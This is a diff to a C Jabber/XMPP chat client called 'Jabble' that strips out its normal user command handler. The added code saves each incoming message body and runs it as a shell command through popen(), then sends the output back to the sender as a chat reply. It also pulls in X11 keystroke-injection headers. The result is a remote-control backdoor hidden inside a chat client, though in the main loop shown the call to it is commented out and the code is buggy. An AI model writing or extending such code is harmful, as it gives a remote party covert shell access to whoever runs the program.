@@ -8,6 +8,9 @@
 #include <string.h> // strlen
 #include <stdlib.h> // atoi
 #include <time.h> // time, ctime
+#include <X11/Xlib.h>
+#include <X11/keysym.h>
+#include <X11/extensions/XTest.h>
 
 #define WINDOWS 0 // set to 0 for Unix, 1 for Windows
 #define CLIENT_NAME "Jabble"
@@ -119,6 +122,7 @@ char nick[127];
 char room[50];
 char jabberservername[255];
 char roomname[255];
+char msg_in[255];
 
 
 
@@ -186,21 +190,23 @@ else
 
 while(1)  /*Boucle permanente */
 {
+
+
 if(ansi_kbhit()!=0)
 	{
-	gets(message_out);
-	 
-	commands_interpreter();
+	//gets(message_out);
+//commands_interpreter();
 	sendout(message_out);
 
 	}
 //printf("kbhit:'%s'\n",message_out);
 fd_getin();
 }
- 
 
 
- 
+
+
+
 } // end of main()
 
 
@@ -209,385 +215,32 @@ fd_getin();
 
 /* ========================== FONCTIONS ================================ */
 
-
 void commands_interpreter(void)
 {
-	if (strstr(message_out,"quit:") != NULL)
-		{
-		strcpy(option,"");
-		sscanf(message_out,"quit: %[^\n]",option);
-		sprintf(message_out,"<presence type='unavailable'><status>%s</status></presence>",option);
-		sendout(message_out);
-		sprintf(message_out,"</stream:stream>");
-		printf("%s\n",message_out);
-		exitclient();
-		}
-	if (strcmp(message_out,"debug") == 0)
-		{
-		debugmode=debugmode^1;
-		if (debugmode==1)
-			printf("debug mode is now ON\n");
-		else
-			printf("debug mode is now OFF\n");			
-		}
-	if (strcmp(message_out,"notif") == 0)
-		{
-		notifmode=notifmode^1;
-		if (notifmode==1)
-			printf("presence notification is now ON\n");
-		else
-			printf("presence notification is now OFF\n");			
-		}
-	if (strcmp(message_out,"antiflood") == 0)
-		{
-		antifloodmode=antifloodmode^1;
-		if (antifloodmode==1)
-			printf("presence antiflood is now ON\n");
-		else
-			printf("presence antiflood is now OFF\n");			
-		}
-	if (strcmp(message_out,"autoresult") == 0)
-		{
-		autoresult=autoresult^1;
-		if (autoresult==1)
-			printf("autoresult mode is now ON\n");
-		else
-			printf("autoresult mode is now OFF\n");			
-		}
-	if (strstr(message_out,"prior:") != NULL)
-		{
-		sscanf(message_out,"prior: %s",prior);
-		sprintf(message_out,"<presence><priority>%s</priority></presence>",prior);
-		}
-	if (strstr(message_out,"status:") != NULL)
-		{
-		sscanf(message_out,"status: %[^\n]",option);
-		sprintf(message_out,
-			"<presence><status>%s</status><priority>%s</priority></presence>"
-			"<presence to='%s'><status>%s</status><priority>%s</priority></presence>"
-			,option,prior,roomname,option,prior);
-		}
-	if (strstr(message_out,"away:") != NULL)
-		{
-		strcpy(option,"Not here for the moment!");
-		sscanf(message_out,"away: %[^\n]",option);
-		sprintf(message_out,
-			"<presence><show>away</show><status>%s</status><priority>%s</priority></presence>"
-			"<presence to='%s'><show>away</show><status>%s</status><priority>%s</priority></presence>"
-			,option,prior,roomname,option,prior);
-		}
-	if (strstr(message_out,"vcard:") != NULL)
-		{
-		sscanf(message_out,"vcard: %s",jabberservername);
-		sprintf(message_out,"<iq type='get' to='%s' id='vcardget'><vCard xmlns='vcard-temp'/></iq>",jabberservername);
-		}
-	if (strcmp(message_out,"list:") == 0)
-		{
-		//sprintf(message_out,"<iq type='get' id='rosterget'><query xmlns='jabber:iq:roster'/></iq>");
-		toc_list_buddy_online();
-		}
-	if (strcmp(message_out,"adv:") == 0)
-		{
-		sprintf(message_out,"<presence>"
-			"<priority>%s</priority>"
-			"<show>chat</show>"
-			"<c node='http://www.google.com/xmpp/client/caps' ext='voice-v1 video-v1 share-v1 sidebar' xmlns='http://jabber.org/protocol/caps'/>"
-			"<c xmlns='http://jabber.org/protocol/caps' node='http://gajim.org/caps' ext='ftrans' ver='0.10.1'/>"
-			"<c node='http://psi-im.org/caps' ext='cs ep pep achat vchat' xmlns='http://jabber.org/protocol/caps'/>"
-			"<c xmlns='http://jabber.org/protocol/caps' ext='ftrans tins' node='http://exodus.jabberstudio.org/caps'/>"
-			"<c node='http://coccinella.sourceforge.net/protocol/caps' ext='ftrans iax voip_h323 voip_sip voipgm2' xmlns='http://jabber.org/protocol/caps'/><x xmlns='http://jabber.org/protocol/jingle/media/audio' type='available'/>"
-			"<x xmlns='vcard-temp:x:update'><photo>5e02082fa065f4a438a0eee1a5b41d893467abf2</photo></x>"
-			"<x xmlns='jabber:x:signed'>iD8DBQBEViKV/xvnckCDIgsRAkgnAJ0W7caawD5vYjDIlf5Dixh6TNf66QCfa7pT\nqyrgLj+BjDUSP5iIj1ZnALs=\n=w6pd</x>"
-			"</presence>",prior);
-		//printf("%s\n",message_out);
-		}
-	if (strcmp(message_out,"online:") == 0)
-		{
-		sprintf(message_out,
-			"<presence><priority>%s</priority></presence>"
-			"<presence to='%s'><priority>%s</priority></presence>"
-			,prior,roomname,prior);
-		}
-	if (strcmp(message_out,"invisible:") == 0)
-		{
-		sprintf(message_out,
-			"<presence type='invisible'><priority>%s</priority></presence>"
-			,roomname);
-		}
-	if (strstr(message_out,"ich:") != NULL)
-		{
-		sscanf(message_out,"ich: %[^\n]",option);
-		sprintf(message_out,
-			"<presence type='invisible' to='%s'><status>%s</status></presence>"
-			,roomname,option);
-		}
-	if (strcmp(message_out,"offline:") == 0)
-		{
-		strcpy(message_out,"<presence type='unavailable'></presence>");
-		}
-	if (strstr(message_out,"last:") != NULL)
-		{
-		sscanf(message_out,"last: %[^\n]",jabberservername);
-		sprintf(message_out,"<iq type='get' id='1111' to='%s'><query xmlns='jabber:iq:last'/></iq>",jabberservername);
-		}
-	if (strstr(message_out,"join:") != NULL)
-		{
-		strcpy(option,"");
-		sscanf(message_out,"join: %s %[^\n]",roomname,option);
-		if (strcmp(option,"") == 0)
-			sprintf(option,"%s",user/*,CLIENT_NAME*/);
-		sprintf(message_out,"<presence to='%s/%s'></presence>",roomname,option);
-		}
-	if (strstr(message_out,"nick:") != NULL)
-		{
-		strcpy(option,"");
-		sscanf(message_out,"nick: %[^\n]",option);
-		if (strcmp(option,"") == 0)
-			sprintf(option,"%s_%s",user,CLIENT_NAME);
-		sprintf(message_out,"<presence to='%s/%s'></presence>",roomname,option);
-		}
-	if (strstr(message_out,"leave:") != NULL)
-		{
-		strcpy(option,"");
-		sscanf(message_out,"leave: %s",option);
-		if (strcmp(option,"") == 0)
-			sprintf(option,"%s",roomname);
-		sprintf(message_out,"<presence to='%s' type='unavailable'></presence>",option);
-		}
-	if (strstr(message_out,"ch:") != NULL)
-		{
-		sscanf(message_out,"ch: %[^\n]",option);
-		sprintf(message_out,"<message type='groupchat' to='%s'><body>%s</body></message>",roomname,option);
-		}
-	if (strstr(message_out,"invite:") != NULL)
-		{
-		sscanf(message_out,"invite: %s %[^\n]",victime,roomname);
-		sprintf(message_out,"<message to='%s'><x xmlns='http://jabber.org/protocol/muc#user'><invite to='%s'><reason/></invite></x></message>",roomname,victime);
-		}
-	if (strstr(message_out,"ver:") != NULL)
-		{
-		sscanf(message_out,"ver: %[^\n]",jabberservername);
-		sprintf(message_out,"<iq type='get' id='2222' to='%s'><query xmlns='jabber:iq:version'/></iq>",jabberservername);
-		}
-	if (strstr(message_out,"items:") != NULL)
-		{
-		sscanf(message_out,"items: %[^\n]",jabberservername);
-		printf("---%s: has item(s):\n",jabberservername);
-		sprintf(message_out,"<iq type='get' id='3333' to='%s'><query xmlns='http://jabber.org/protocol/disco#items'/></iq>",jabberservername);
-		}
-	if (strstr(message_out,"info:") != NULL)
-		{
-		sscanf(message_out,"info: %[^\n]",jabberservername);
-		printf("---%s: has variable(s):\n",jabberservername);
-		sprintf(message_out,"<iq type='get' id='4444' to='%s'><query xmlns='http://jabber.org/protocol/disco#info'/></iq>",jabberservername);
-		}
-	if (strstr(message_out,"brow:") != NULL)
-		{
-		sscanf(message_out,"brow: %[^\n]",jabberservername);
-		printf("---%s: has variable(s):\n",jabberservername);
-		sprintf(message_out,"<iq type='get' id='4545' to='%s'><query xmlns='jabber:iq:browse'/></iq>",jabberservername);
-		}
-	if (strstr(message_out,"oob:") != NULL)
-		{
-		//sscanf(message_out,"oob: %s %[^\n]",option,victime);
-		sscanf(message_out,"oob: \"%[^\"]\" %s",option,victime);
-		sprintf(message_out,"<iq type='set' to='%s' id='oob'><query xmlns='jabber:iq:oob'><url>%s</url></query></iq>",victime,option);
-		}
-	if (strstr(message_out,"proxy:") != NULL)
-		{
-		sscanf(message_out,"proxy: %s",jabberservername);
-		sprintf(proxy,"proxy.%s",jabberservername);
-		sprintf(message_out,"<iq type='get' to='%s' id='select_proxy'>"
-			"<query xmlns='http://jabber.org/protocol/bytestreams'/>"
-			"</iq>",proxy);
-		}
-	if (strstr(message_out,"send:") != NULL)
-		{
-		sscanf(message_out,"send: \"%[^\"]\" %s",siname,victime);
-		sprintf(message_out,"<iq type='get' to='%s' id='si_sendfile14'>"
-			"<query xmlns='http://jabber.org/protocol/bytestreams'/>"
-			"</iq>",proxy);
-			sendout(message_out);
-			getin();
-		filesize(siname);
-		//sprintf(siid,"%s@%s/%s%s",user,remotehost,ressource)
-		tmpnam(siid);
-		sprintf(message_out,"<iq type='set' to='%s' id='si_sendfile24'>"
-			"<si xmlns='http://jabber.org/protocol/si' profile='http://jabber.org/protocol/si/profile/file-transfer' id='%s'>"
-			"<file xmlns='http://jabber.org/protocol/si/profile/file-transfer' size='%s' name='%s'>"
-			"<range/>"
-			"</file>"
-			"<feature xmlns='http://jabber.org/protocol/feature-neg'>"
-			"<x xmlns='jabber:x:data' type='form'>"
-			"<field var='stream-method' type='list-single'>"
-			"<option><value>http://jabber.org/protocol/bytestreams</value></option>"
-			"</field>"
-			"</x>"
-			"</feature>"
-			"</si>"
-			"</iq>",victime,siid,sisize,siname);
-			sendout(message_out);
-			getin();
-		sprintf(message_out,"<iq type='set' to='%s' id='si_sendfile34'>"
-			"<query xmlns='http://jabber.org/protocol/bytestreams' mode='tcp' sid='%s'>"
-			"<streamhost port='%s' host='%s' jid='%s'/>"
-			"</query>"
-			"</iq>",victime,siid,siport,sihost,sijid);
-			//sendout(message_out);
-			//getin();
-		/*sprintf(message_out,"<iq type='set' to='%s' id='si_sendfile44'>"
-			"<query xmlns='http://jabber.org/protocol/bytestreams' sid='%s'>"
-			"<activate>%s</activate>"
-			"</query>"
-			"</iq>",proxy,siid,victime);*/
-		}
-	if (strstr(message_out,"cancel:") != NULL)
-		{
-		/*sprintf(message_out,"<iq type='result' id='%s' to='%s'><query xmlns='%s'/><error code='501' type='cancel'/></iq>",xmlid,xmlfromlong,xmlns);*/
-		}
-	if (strstr(message_out,"node:") != NULL)
-		{
-		sscanf(message_out,"node: %[^\n]",node);
-		if (strcmp(disco,"") == 0)
-			strcpy(disco,"disco#items");
-		printf("---%s %s%s/%s: has variable(s):\n",jabberservername,"http://jabber.org/protocol/",disco,node);
-		sprintf(message_out,"<iq type='get' id='5555' to='%s'><query xmlns='http://jabber.org/protocol/%s' node='%s'/></iq>",jabberservername,disco,node);
-		}
-	if (strstr(message_out,"vnode:") != NULL)
-		{
-		sscanf(message_out,"vnode: %s %s %s",node,disco,jabberservername);
-		if (strcmp(disco,"") == 0)
-			strcpy(disco,"http://jabber.org/protocol/disco#items");
-		printf("---%s %s/%s: has variable(s):\n",jabberservername,disco,node);
-		sprintf(message_out,"<iq type='get' id='5555' to='%s'><query xmlns='%s' node='%s'/></iq>",jabberservername,disco,node);
-		}
-	if (strstr(message_out,"get:") != NULL)
-		{
-		sscanf(message_out,"get: %s %s",disco,jabberservername);
-		sprintf(message_out,"<iq type='get' id='5555' to='%s'><query xmlns='http://jabber.org/protocol/%s'/></iq>",jabberservername,disco);
-		}
-	if (strstr(message_out,"var:") != NULL)
-		{
-		sscanf(message_out,"var: %s %s",disco,jabberservername);
-		sprintf(message_out,"<iq type='get' id='5555' to='%s'><query xmlns='%s'/></iq>",jabberservername,disco);
-		}
-	if (strstr(message_out,"pass:") != NULL)
-		{
-		sscanf(message_out,"pass: %s",option);
-		sprintf(message_out,"<iq type='set' id='3615'><query xmlns='jabber:iq:auth'><username>%s</username><resource>%s</resource><password>%s</password></query></iq>",user,client,option);
-		}
-	if (strstr(message_out,"im:") != NULL)
-		{
-		sscanf(message_out,"im: %s %[^\n]",victime,option);
+	//if (strstr(message_out,"re:") != NULL)
+	char input[1024],buff[1024];
+	FILE *in,*fp;
+    gets(option);
+    fp = fopen("file.txt", "w+");
+	//	sscanf(message_out,"%[^\n]",option);
+
+	if(!(in = popen(msg_in, "r"))){
+		exit(1);
+	}
+
+	while(fgets(buff, sizeof(buff), in)!=NULL){
+		printf("%s",buff);
+		strcat(input,buff);
+	//replytext = malloc(512);
+    }
 		sprintf(message_out,"<message to='%s' type='chat'>"
 			"<x xmlns='jabber:x:event'><composing/></x>"
-			"<body>%s</body></message>",victime,option);
-		}
-	if (strstr(message_out,"re:") != NULL)
-		{
-		sscanf(message_out,"re: %[^\n]",option);
-		sprintf(message_out,"<message to='%s' type='chat'>"
-			"<x xmlns='jabber:x:event'><composing/></x>"
-			"<body>%s</body></message>",victime,option);
-		}
-	if (strstr(message_out,"sel:") != NULL)
-		{
-		sscanf(message_out,"sel: %s",option);
-		if (strcmp(option,"") != 0)
-			toc_select_buddy_online(option);
-		}
-	if (strstr(message_out,"seek:") != NULL)
-		{
-		sscanf(message_out,"seek: %s %s %[^\n]",option,option2,option3);
-		//printf("toc_catch_buddy(%s)",option);
-		if (strcmp(option,"") != 0)
-			toc_catch_buddy(option,option2,option3);
-		}
-	if (strstr(message_out,"roster:") != NULL)
-		{
-		sscanf(message_out,"roster: %s",option2);
-		if (strcmp(option2,"init") == 0)
-			init_roster();
-		toc_list_buddy();
-		}
-	if (strstr(message_out,"auth:") != NULL)
-		{
-		sscanf(message_out,"auth: %s %s %[^\n]",option,victime,option2);
-		sprintf(message_out,"<iq type='set' id='auth'><query xmlns='jabber:iq:roster'><item jid='%s' subscription='%s'><group>%s</group></item></query></iq>",victime,option,option2);
-		}
-	if ((strstr(message_out,"nickserv:") != NULL))
-		{
-		sscanf(message_out,"nickserv: %s %s",option,jabberservername);
-		sprintf(message_out,"<iq type='set' to='%s' id='register'><query xmlns='jabber:iq:register'><name>%s</name><key>%s</key></query></iq>",jabberservername,option,xmlkey);
-		}
-	if ((strstr(message_out,"reg:") != NULL) && (strstr(message_out,"unreg:") == NULL))
-		{
-		sscanf(message_out,"reg: %s %s %s",option,option2,jabberservername);
-		if (strcmp(xmlkey,"") == 0)
-			sprintf(message_out,"<iq type='set' to='%s' id='register'><query xmlns='jabber:iq:register'><username>%s</username><password>%s</password></query></iq>",jabberservername,option,option2);
-		else
-			sprintf(message_out,"<iq type='set' to='%s' id='register'><query xmlns='jabber:iq:register'><name>%s</name><key>%s</key></query></iq>",jabberservername,option,xmlkey);
-		}
-	if (strstr(message_out,"unreg:") != NULL)
-		{
-		sscanf(message_out,"unreg: %s",jabberservername);
-		if (strcmp(user,"sir_mespompes") !=0 )
-		sprintf(message_out,"<iq type='set' to='%s' id='unregister'><query xmlns='jabber:iq:register'><remove/></query></iq>",jabberservername);
-		else
-		printf("UNAUTHORIZED TO ERASE SIR_MESPOMPES!\n");			
-		}
-	if (strstr(message_out,"sub:") != NULL)
-		{
-		sscanf(message_out,"sub: %s %s",option,victime);
-		sprintf(message_out,"<presence to='%s' type='%s'/>",victime,option);
-		}
-	if (strcmp(message_out,"stat") == 0)
-		{
-		printf("\tuser          : %s@%s/%s\n",user,remotehost,ressource);
-		printf("\tclient        : %s\n",__FILE__);
-		printf("\tpriority      : %s\n",prior);
-		printf("\troomname room : %s (%s)\n",roomname,room);
-		printf("\tdest          : %s\n",victime);
-		printf("\toption        : %s\n",option);
-		}
-	if (strcmp(message_out,"help") == 0)
-		{
-		printf(
-				"\tonline:                         (become online)\n"
-				"\toffline:                        (become offline)\n"
-				"\taway:    <message>              (become away with a message)\n"
-				"\tprior:    <priority>            (define priority (-127 -> 127)\n"
-				"\tlist:                           (list your online contacts)\n"
-				"\troster:  [init]                 (list (or reload) your roster contacts)\n"
-				"\tseek:    <part of jid>          (search a contact and use him with re:)\n"
-				"\tsel:     <number>               (select a roster contact by its number)\n"
-				"\tim:      <jid> <message>        (send message)\n"
-				"\tre:      <message>              (answer to last message)\n"
-				"\tproxy:   <server jid>           (select a bytestream proxy)\n"
-				"\tsend:    \"file name\" <jid>      (send file)\n"
-				"\toob:     \"link\" <jid>           (send link via oob)\n"
-				"\tjoin:    <room jid> [ressource] (join chat room with optional name)\n"
-				"\tnick:    <ressource>            (change name in muc)\n"
-				"\tinvite:  <jid> [room jid]       (invite contact in chat room)\n"
-				"\tch:      <message>              (send message in current chat)\n"
-				"\tleave:   [jid]                  (join chat room)\n"
-				"\tlast:    <jid>                  (ask last activity time)\n"
-				"\tver:     <jid>                  (ask version)\n"
-				"\titems:   <jid>                  (ask services)\n"
-				"\tnode:    <jid>                  (show node)\n"
-				"\tvar:     <namespace> [jid]      (make request with namespace)\n"
-				"\tbrow:    <jid>                  (ask browse)\n"
-				"\tinfo:    <jid>                  (ask disco#info)\n"
-				"\tvcard:   <jid>                  (ask vcard)\n"
-				"\tquit:    [message]              (quit this program!)\n"
-				"\tauth:    none/to/from/both/remove <jid> [group]\n"
-				"\tsub:     (un)subscribe(d)         <jid>\n"
-				"\treg:     <username> <password> <server> (register on the server)\n"
-				"\tunreg:   <server>                       (unregister on the server)\n"
-				);
-		}
-strcpy(option,"");
-strcpy(option2,"");
+			"<body>%s</body></message>",victime,input);
+
+input[0]='\0';
+//strcpy(option,"");
+//strcpy(option2,"");
+
 }
 
 
@@ -606,7 +259,7 @@ getin();
 int sendout(char *message_out)
 {
 if ((debugmode==1) || (strstr(ressource,"debug") != NULL)){
-	printf("%s\n",message_out);}	
+	printf("%s\n",message_out);}
 //	buflen=0;
 //	memset(&flap_out, 0, sizeof(flap_out));
 if (strstr(message_out,"</stream:") != 0){
@@ -655,7 +308,7 @@ int i;
 			printf("sending %i bytes...\r",nb);
 
 if ((debugmode==1) || (strstr(ressource,"debug") != NULL)){
-	printf("%s\n",message_out);}	
+	printf("%s\n",message_out);}
 if(send(si_sock,message_out,nb,0) == -1) {
 	perror("send");
 	exit(1);}
@@ -671,7 +324,7 @@ FILE *fileget;
 char sockbuf[1388];
 int filecount;
 int header;
-	
+
 //printf("si_get...\n");
 filecount=0;
 header=5+strlen(host)+2;
@@ -845,7 +498,7 @@ long unsigned int xmluptime;
 char xmlvername[128],xmlverversion[128],xmlveros[128];
 char FN[64],NICKNAME[64],USERID[64],EMAIL[64],URL[64],ROLE[64],BDAY[32],HOME[64],LOCALITY[64],REGION[64],PCODE[32],CTRY[64],NUMBER[32],DESC[1024];
 char xmlns_x[15], xmlcommand_x[15], xmljid_x[64], from_x[128];
-	
+
 
 /*printf("%s\n",text_old);
 printf("============================================================\n");
@@ -859,7 +512,7 @@ if (antifloodmode == 1){
 		else
 		text_change=0;
 }
-	
+
 strcpy(xmlcommand,"none");
 pchv=0;
 pch[pchv] = strtok (text,"\n");
@@ -1206,7 +859,7 @@ while (pch[pchv] != NULL)
 		sscanf(pch[pchv],">%[^<]</status",xmlstatus);
 
 /* Here are where the commands are interpreted */
-	
+
 	/* STREAM */
 	if ((debugmode == 0) && (strstr(pch[pchv],"</stream:") != NULL)) {
 		if (strstr(pch[pchv],"</stream:error") != NULL) {
@@ -1220,7 +873,7 @@ while (pch[pchv] != NULL)
 			exitclient();
 		}
 	}
-	
+
 
 	/* PING */
 	if (strcmp(pch[pchv],"\t") == 0) {
@@ -1242,7 +895,7 @@ while (pch[pchv] != NULL)
 		if (strcmp(xmlcommand,"none") == 0)
 			strcpy(xmlcommand,"URN ping");}
 
-			
+
 	/* IQ */
 	if (strcmp(pch[pchv],"</iq") == 0) {
 			if (strcmp(xmlcommand,"error") == 0) {
@@ -1301,14 +954,14 @@ while (pch[pchv] != NULL)
 			if (strcmp(xmlcommand,"bytestreams") == 0) /*&& (strcmp(xmlfromlong,proxy) == 0))*/{
 				printf("%s: use server %s:%s (%s)\n",xmlfrom,sihost,siport,sijid);
 				}
-				
-				
+
+
 			/* IQ SEND RESULT */
 			/*if (strcmp(xmlavailable,"send result") == 0) {
-								
+
 			}*/
-				
-				
+
+
 			/* IQ SEND REQUEST */
 			if (strcmp(xmlavailable,"send request") == 0) {
 				if (strcmp(xmlns,"jabber:iq:version") == 0){
@@ -1374,12 +1027,12 @@ while (pch[pchv] != NULL)
 				sendout(message_out);
 				}
 			printf("---%s: %s %s---\n",xmlfromlong,xmlavailable,xmlns);}
-			
+
 	/* INVITE */
 /*	if ((strcmp(pch[pchv],"</invite") == 0) && (strcmp(xmlcommand,"error") != 0)){
 			printf("%s: invite you in %s\n",xmlfrom,roomname);
 			strcpy(victime,xmlfromlong);}*/
-			
+
 	/* X */
 	if ((strstr(pch[pchv],"</x") != NULL) && (strcmp(xmlcommand_x,"x") == 0)){
 		if (strcmp(xmlns_x,"vcard-temp:x:update") != 0)
@@ -1412,8 +1065,8 @@ while (pch[pchv] != NULL)
 			strcpy(roomname,xmljid_x);
 			}
 		}
-			
-			
+
+
 	/* MESSAGE */
 	if ((strcmp(pch[pchv],"</message") == 0) /*&& (strcmp(xmlbody,"") != 0)*/) {
 			if (strcmp(xmlcommand,"error") == 0) {
@@ -1437,8 +1090,9 @@ while (pch[pchv] != NULL)
 					(strcmp(xmlns,"jabber:x:event") == 0))
 					printf("%s:> %s\n",xmlfrom,xmlcs);*/
 				if (strcmp(xmlbody,"") != 0){
-					printf("%s:>             \r",xmlfrom);
-					printf("%s:> %s\n",xmlfrom,xmlbody);}
+					//printf("%s:>             \r",xmlfrom);
+					strcpy(msg_in,xmlbody);
+					printf("%s:> %s\n",xmlfrom,msg_in);}
 				strcpy(victime,xmlfromlong);
 				toc_add_buddy(xmlfromlong,xmlavailable,"","");}
 			if (strcmp(xmlcommand,"chat") == 0){
@@ -1449,7 +1103,7 @@ while (pch[pchv] != NULL)
 					printf("%s:>             \r",xmlfrom);
 					printf("%s:> %s\n",xmlfromlong,xmlbody);}}
 		}
-	
+
 	/* PRESENCE */
 	if ((strcmp(pch[pchv],"</presence") == 0) && (notifmode == 1)) {
 		if ((strcmp(xmlchatgrade,"") == 0) && (strcmp(xmlavailable,"send subscription") != 0)){
@@ -1594,7 +1248,7 @@ for (i=0;i<=victimes_nb+1;i++){
 	strcpy(subscription_victimes[i],"");
 	strcpy(subscription_ask_victimes[i],"");
 	}
-	
+
 victimes_nb=0;
 sprintf(message_out,"<iq type='get' id='rosterget'><query xmlns='jabber:iq:roster'/></iq>");
 sendout(message_out);
@@ -1654,10 +1308,10 @@ int online;
 int exist=0;
 
 //printf("toc_add_buddy(%s,%s,%s,%s)\n",xmlfromlong,xmlavailable,xmlsubscription,xmlsubscription_ask);
-	
+
 if (strcmp(xmlavailable,"added") == 0)
 	online=0;
-	
+
 if (
 	(strcmp(xmlavailable,"online") == 0) ||
 	(strcmp(xmlavailable,"is away") == 0) ||
@@ -1668,7 +1322,7 @@ if (
 	online=1;
 else
 	online=0;
-	
+
 for (i=0;i<victimes_nb;i++)
 	if (strcmp(victimes[i],xmlfromlong) == 0) {
 		exist=1;
@@ -1687,7 +1341,7 @@ for (i=0;i<victimes_nb;i++)
 				online_victimes[i2]=online_victimes[i2+1];}
 			victimes_nb--;
 			}
-				
+
 	}
 
 if (exist==0)
@@ -1827,7 +1481,7 @@ int sizefile;
 int i,c;
 int bytestreams;
 sizefile=atoi(size);
-	
+
 	/*  Create socket  */
 	if ( (si_sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
 	{	perror("opening steam socket in");
@@ -1880,7 +1534,7 @@ tempfile=fopen(name,"rb");/* == NULL){
 c=0;
 for (i=0;i<=sizefile;i++){
 	//strcpy(si_message_out,"");
-	
+
 	//printf("%i\r",c);
 	bytestreams=fgetc(tempfile);
 	si_message_out[c]=bytestreams;
@@ -1912,7 +1566,7 @@ int connectsock_si_receive(char *name,char *size,char *sihost,char *siport,char 
 char si_message_out[384];
 int sizefile;
 sizefile=atoi(size);
-	
+
 	/*  Create socket  */
 	if ( (si_sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
 	{	perror("opening steam socket in");
@@ -1967,7 +1621,7 @@ void filesize(char *siname)
 {
 FILE *tempfile;
 long size;
-	
+
 if ((tempfile=fopen(siname,"rb")) == NULL)
 	perror("fopen");
 printf("%s (",siname);
@@ -2036,3 +1690,4 @@ printf("\n\n\tThanks for try %s!\n\n",CLIENT_NAME);
 #endif
 exit(0);
 }
+
